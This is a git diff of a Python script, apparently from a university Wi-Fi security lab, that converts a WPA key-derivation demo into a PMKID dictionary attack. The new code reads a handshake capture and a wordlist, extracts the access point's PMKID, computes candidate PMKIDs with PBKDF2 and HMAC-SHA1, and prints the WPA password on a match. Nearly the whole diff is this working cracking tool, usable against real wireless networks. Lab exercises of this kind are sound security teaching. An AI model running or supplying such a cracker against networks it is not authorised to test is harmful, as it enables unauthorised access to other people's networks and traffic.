@@ -2,11 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-Derive WPA keys from Passphrase and 4-way handshake info
 
-Calcule un MIC d'authentification (le MIC pour la transmission de données
-utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
-sha-1 pour WPA2 ou MD5 pour WPA)
 """
 
 __author__      = "Abraham Rubinstein et Yann Lederrey"
@@ -17,25 +13,20 @@ __email__ 		= "abraham.rubinstein@heig-vd.ch"
 __status__ 		= "Prototype"
 
 from scapy.all import *
-from binascii import a2b_hex, b2a_hex
-#from pbkdf2 import pbkdf2_hex
 from pbkdf2 import *
-from numpy import array_split
-from numpy import array
 import hmac, hashlib
+import argparse
 
-def customPRF512(key,A,B):
-    """
-    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
-    """
-    blen = 64
-    i    = 0
-    R    = b''
-    while i<=((blen*8+159)/160):
-        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
-        i+=1
-        R = R+hmacsha1.digest()
-    return R[:blen]
+# Argument handling
+parser = argparse.ArgumentParser(description='Process .pcap file and wordlist file')
+parser.add_argument('-c', '--pcap', type=str, required=True,help='path to .pcap file')
+parser.add_argument('-w', '--wordlist', type=str, required=True,help='path to wordlist file')
+
+args = parser.parse_args()
+
+pcap = args.pcap
+wordlist = args.wordlist
+
 
 # Custom class to store the SSID and MAC address of an AP   
 class AP(NamedTuple):
@@ -61,83 +52,64 @@ def find_ssid(pcap):
         return AP(ssid=ssid, mac_address=mac)
     # If there are multiple, ask user to choose and return the chosen one
     elif len(ssids) > 1:
+        # Initialiaze empty array for found APs
         ssid_infos = []
+        # Add AP object to array
         for ssid, mac in ssids.items():
             ssid_infos.append(AP(ssid=ssid, mac_address=mac))
+        
         print("Multiple SSIDs found:")
+        
+        # Display found APs with index
         for i, ssid_info in enumerate(ssid_infos):
             print(f"{i}: SSID: {ssid_info.ssid} | MAC Address: {ssid_info.mac_address}")
-        chosen_ssid_index = input("Please choose an SSID by typing its index: ")
+        chosen_ssid_index = input("Enter the number of the AP you want to choose: ")
+        
+        # Ask for input as long as the input is not valid
         while not chosen_ssid_index.isdigit() or int(chosen_ssid_index) not in range(len(ssids)):
             chosen_ssid_index = input("Invalid choice. Please choose an SSID by typing its index: ")
+        
+        # Retrieve SSID and MAC address for chosen AP
         chosen_ssid = ssid_infos[int(chosen_ssid_index)].ssid
         mac = ssids[chosen_ssid]
+        
         return AP(ssid=chosen_ssid, mac_address=mac)
     else:
         print("No AP found in capture, exiting...")
         exit()
 
-# Function used to get wifi clients from a wireshark capture
-def get_wifi_clients(pcap):
-    # Initialize and empty dictionnary to contain clients
-    clients = {}
-    # Iterate over all the packets
-    for packet in pcap:
-        # If packet is a 802.11 packet
-        if packet.haslayer(Dot11):
-            # add client to dict if not seen before
-            if packet.addr2 not in clients:
-                clients[packet.addr2] = 0
-            # check if packet is a beacon
-            if packet.haslayer(Dot11Beacon):
-                # increment beacon count for this client
-                clients[packet.addr2] += 1
-    # filter out clients that have emitted a beacon
-    clients = {k:v for k,v in clients.items() if v == 0}
-    # Get the number of 
-    num_clients = len(clients)
-    # If there is exactly one client, return it's MAC address
-    if num_clients == 1:
-        return list(clients.keys())[0]
-    # If there is more than one client, ask user which to select
-    elif num_clients > 1:
-        print("Found multiple WiFi clients:")
-        for i, client in enumerate(clients.keys()):
-            print(f"{i+1}. {client}")
-        choice = input("Enter the number of the client to choose: ")
-        return list(clients.keys())[int(choice)-1]
+# Function used to find clients who were captured doing a 4-way handshake with an AP
+def get_wpa_clients(pcap, ap_mac):
+    # Create a list to store the client MAC addresses
+    clients = []
+    
+    # Loop through the packets in the capture file
+    for pkt in pcap:
+        # Check if the packet is a WPA 4-way handshake packet
+        if pkt.haslayer(EAPOL) and pkt[EAPOL].type == 3:
+            # Check if the packet is from the AP we're interested in
+            if pkt.addr2 == ap_mac:
+                # Check if the client MAC address is already in the list
+                if pkt.addr1 not in clients:
+                    clients.append(pkt.addr1)
+    
+    # Check if there are any clients in the list
+    if len(clients) == 0:
+        print("No clients found.")
+        return None
+    
+    # Check if there is only one client in the list
+    elif len(clients) == 1:
+        print("Found 1 client: " + clients[0])
+        return clients[0]
+    
+    # If there are multiple clients in the list, ask the user to choose one
     else:
-        print("No WiFi clients found, exiting...")
-        exit()
-# Function used to retrieve WPA nonces from a wireshark capture
-def get_wpa_nonce(pcap, mac):
-    for packet in pcap:
-        # check if the packet is a WPA key packet from the AP
-        if packet.haslayer(EAPOL) and packet.addr2 == mac:
-            # extract the nonce value from the packet's WPA key data
-            key_data = packet[EAPOL].load
-            nonce = key_data[13:45].hex()
-            return nonce
-    # if no WPA nonce is found, return None
-    print("Nonce not found in packets")
-    exit()
-
-# Function used to retrieve the MIC of the 4th packet of the 4-way handshake
-def get_wpa_mic(pcap, client_mac, ap_mac):
-    for packet in pcap:
-        # check if the packet is the fourth packet of a 4-way handshake from the client to the AP
-        if (packet.haslayer(EAPOL) 
-        and packet.addr2 == client_mac 
-        and packet.addr1 == ap_mac 
-        and packet[EAPOL].type == 3
-        and packet[EAPOL].len == 95):
-            # extract the WPA MIC value from the packet's WPA key data
-            key_data = packet[EAPOL].load
-            mic = key_data[-18:-2].hex()
-            return mic
-    # if no WPA MIC is found, return None
-    print("MIC not found, maybe there is no 4-way handshake ?")
-    exit()
+        print("Found multiple clients:")
+        for i, client in enumerate(clients):
+            print(str(i) + ": " + client)
+        choice = int(input("Enter the number of the client you want to choose: "))
+        return clients[choice]
 
 # Function used to retrive the PMKID from the 1st packet of a WPA 4-way handshake
 def get_wpa_pmkid(pcap, client_mac, ap_mac):
@@ -154,20 +126,43 @@ def get_wpa_pmkid(pcap, client_mac, ap_mac):
     print("PMKID not found")
     exit()
 
-# Read capture file -- it contains beacon, authentication, associacion, handshake and data
-wpa=rdpcap("PMKID_handshake.pcap") 
+# Function to calculate PMKID
+def make_pmkid(ap_mac, client_mac, ssid, passphrase):
+    ap_mac = ap_mac.lower().replace(":", "")
+    client_mac = client_mac.lower().replace(":", "")
+    ssid = ssid.encode()
+    pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid, 4096, 32)
+    pmkid = hmac.new(pmk, b"PMK Name" + bytes.fromhex(ap_mac) + bytes.fromhex(client_mac), hashlib.sha1).hexdigest()[:32]
+    return pmkid
+
+
+
+wpa=rdpcap(pcap)
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
 passPhrase  = "actuelle"
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function
 # Construct an AP object from the capture
 AP          = find_ssid(wpa)
-# Get the client mac address
-cl_mac      = get_wifi_clients(wpa)
-# Get the ssid from the AP object
 ssid        = AP.ssid
-# Transform MAC address to remove semi colons
-APmac       = a2b_hex(AP.mac_address.replace(':',''))
-Clientmac   = a2b_hex(cl_mac.replace(':',''))
+ap_mac      = AP.mac_address
+# Get the client mac address
+cl_mac      = get_wpa_clients(wpa, AP.mac_address)
+# Get the ssid from the AP object
 
-print(get_wpa_pmkid(wpa, cl_mac, AP.mac_address))
+
+
+# Retrieve the PMKID from the wireshark capture to check bruteforce against
+pmkid_to_check = get_wpa_pmkid(wpa, cl_mac, ap_mac)
+
+# Read wordlist line by line
+with open(wordlist, 'r') as file:
+    for line in file:
+        # Calculate the PMKID for the given password
+        pmkid_for_line = make_pmkid(ap_mac, cl_mac, ssid, line.strip())
+
+        if pmkid_for_line == pmkid_to_check:
+            print(f'WPA Password is : {line}')
+            exit()
+
+    print('No matching password found in wordlist')
